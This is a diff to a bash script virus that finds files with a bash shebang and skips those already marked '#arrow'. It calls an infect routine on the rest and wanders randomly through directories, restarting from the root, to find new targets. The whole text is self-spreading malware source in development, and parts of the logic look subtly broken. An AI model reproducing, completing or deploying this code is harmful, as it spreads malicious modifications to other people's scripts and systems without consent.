@@ -46,38 +46,58 @@ FLAG="#arrow"
 function check() {
    
    local IFBASH=$(grep -Fx "$SHEBANG" *)
-
-   local LDIR=$(ls -d *)
-
+   
    if [ "$IFBASH" =~ .*"$SHEBANG" ]
 
    then
-       local LISTNOTREADY=$(echo "$IFBASH" | tr -d ':#!/bin/bash')
-       local LISTNOTREADYD=$(echo "$LISTNOTREADY" | sed -e 's/ /\ ,/g')
-       local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
-       local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':#arrow')
-       LIST=$(echo "$LISTNOTREADY2D" | sed -e 's/ /\ ,/g')
-
-       infect
-
+      
+      local LISTNOTREADY=$(echo "$IFBASH" | tr -d ':#!/bin/bash')
+      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | sed -e 's/ /\ ,/g')
+      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
+      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | tr -d ':#arrow')
+      LIST=$(echo "$LISTNOTREADY2D" | sed -e 's/ /\ ,/g')
+       
+      if [ "$LIST" == "" ]
+       
+      then
+         
+         foldercheck
+      
+      else
+         
+         infect
+      
+      fi
+      
     else
        
-       if [ "$LDIR" == "" ]
-
-       then
-          cd /
-
-          check
-
-       else 
-           CDDIR=$(shuf -n1 "$LDIR")
-
-           cd "$CDDIR"
-
-           check
-        fi
+       foldercheck
+       
     fi
+   
 }
+
+function foldercheck() {
+   
+   local LDIR=$(ls -d *)
+   
+   if [ "$LDIR" == "" ]
+
+   then
+      cd /
+
+      check
+
+   else
+          
+      echo "$LDIR" > LIST.txt
+      
+      CDDIR=$(shuf -n1 LIST.txt)
+      
+      cd "$CDDIR"
+      
+      check
+   fi
 
 # infect files
 
